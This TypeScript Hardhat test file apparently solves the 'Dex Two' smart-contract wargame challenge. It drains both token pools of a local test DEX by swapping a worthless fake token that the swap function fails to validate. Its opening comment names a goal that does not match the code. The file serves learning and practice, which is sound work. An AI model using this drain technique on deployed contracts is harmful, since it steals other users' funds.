import {expect} from "./utils/chai-setup";
import {ethers, deployments, getNamedAccounts} from 'hardhat';
import { Deployment } from "hardhat-deploy/dist/types";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import {setup} from './utils/index';
import type { DexTwo, SwappableTokenTwo, DexTwoFakeToken } from '../typechain-types';

// Goal: 1. you claim ownership of the contract; 2. you reduce its balance to 0

describe('DexTwo', () => {
  let deployer: SignerWithAddress;
  let user1: SignerWithAddress;
  let dexTwo: DexTwo;
  let swappableTokenTwo1: SwappableTokenTwo;
  let swappableTokenTwo2: SwappableTokenTwo;
  let dexTwoFakeToken: DexTwoFakeToken;

  beforeEach(async () => {
    ({deployer, user1} = await setup());

    await deployments.fixture(['dexTwo', 'swappableTokenTwo1', 'swappableTokenTwo2', 'dexTwoFakeToken']);

    const DexTwoDeployment: Deployment = await deployments.get('DexTwo');
    dexTwo = await Promise.resolve(ethers.getContractAt('DexTwo', DexTwoDeployment.address) as Promise<DexTwo>);

    const SwappableTokenTwo1Deployment: Deployment = await deployments.get('SwappableTokenTwo1');
    swappableTokenTwo1 = await Promise.resolve(ethers.getContractAt('SwappableTokenTwo', SwappableTokenTwo1Deployment.address) as Promise<SwappableTokenTwo>);

    const SwappableTokenTwo2Deployment: Deployment = await deployments.get('SwappableTokenTwo2');
    swappableTokenTwo2 = await Promise.resolve(ethers.getContractAt('SwappableTokenTwo', SwappableTokenTwo2Deployment.address) as Promise<SwappableTokenTwo>);

    const DexTwoFakeTokenDeployment: Deployment = await deployments.get('DexTwoFakeToken');
    dexTwoFakeToken = await Promise.resolve(ethers.getContractAt('DexTwoFakeToken', DexTwoFakeTokenDeployment.address) as Promise<DexTwoFakeToken>);
  });


  it('', async () => {
    // Challenge set-up: contract gets 100 of each token
    await dexTwo.setTokens(swappableTokenTwo1.address, swappableTokenTwo2.address);
    await swappableTokenTwo1["approve(address,address,uint256)"](deployer.address, dexTwo.address, ethers.BigNumber.from('100'));
    await dexTwo.add_liquidity(swappableTokenTwo1.address, ethers.BigNumber.from('100'));
    await swappableTokenTwo2["approve(address,address,uint256)"](deployer.address, dexTwo.address, ethers.BigNumber.from('100'));
    await dexTwo.add_liquidity(swappableTokenTwo2.address, ethers.BigNumber.from('100'));

    // Challenge set-up: user1 gets 10 of each token
    await swappableTokenTwo1.transfer(user1.address, ethers.BigNumber.from('10'));
    await swappableTokenTwo2.transfer(user1.address, ethers.BigNumber.from('10'));

    expect(await dexTwo.balanceOf(swappableTokenTwo1.address, user1.address)).to.equal(ethers.BigNumber.from('10'));
    expect(await dexTwo.balanceOf(swappableTokenTwo2.address, user1.address)).to.equal(ethers.BigNumber.from('10'));
    // *************************

    let token1Balance = await dexTwo.balanceOf(swappableTokenTwo1.address, user1.address);
    let token2Balance = await dexTwo.balanceOf(swappableTokenTwo2.address, user1.address);
    // console.log(token1Balance.toString());
    // console.log(token2Balance.toString()); 
    let dexToken1Balance = await dexTwo.balanceOf(swappableTokenTwo1.address, dexTwo.address);
    let dexToken2Balance = await dexTwo.balanceOf(swappableTokenTwo2.address, dexTwo.address);
    // console.log(dexToken1Balance.toString());
    // console.log(dexToken2Balance.toString()); 

    // Transfer 100 dexTwoFakeToken tokens to dexTwo
    await dexTwoFakeToken.connect(user1).transfer(dexTwo.address, ethers.BigNumber.from('100'));    
    await dexTwoFakeToken.connect(user1).approve(dexTwo.address, ethers.BigNumber.from('100'));

    await dexTwo.connect(user1).swap(dexTwoFakeToken.address, swappableTokenTwo1.address, ethers.BigNumber.from('100'));

    // Transfer 100 dexTwoFakeToken tokens to dexTwo
    await dexTwoFakeToken.connect(user1).transfer(dexTwo.address, ethers.BigNumber.from('100'));    
    await dexTwoFakeToken.connect(user1).approve(dexTwo.address, ethers.BigNumber.from('300'));

    await dexTwo.connect(user1).swap(dexTwoFakeToken.address, swappableTokenTwo2.address, ethers.BigNumber.from('300'));
     

    token1Balance = await dexTwo.balanceOf(swappableTokenTwo1.address, user1.address);
    token2Balance = await dexTwo.balanceOf(swappableTokenTwo2.address, user1.address);
    // console.log(token1Balance.toString());
    // console.log(token2Balance.toString()); 
    dexToken1Balance = await dexTwo.balanceOf(swappableTokenTwo1.address, dexTwo.address);
    dexToken2Balance = await dexTwo.balanceOf(swappableTokenTwo2.address, dexTwo.address);
    // console.log(dexToken1Balance.toString());
    // console.log(dexToken2Balance.toString()); 

    expect(dexToken1Balance).to.equal(ethers.BigNumber.from('0'));
    expect(dexToken2Balance).to.equal(ethers.BigNumber.from('0'));
  });

});
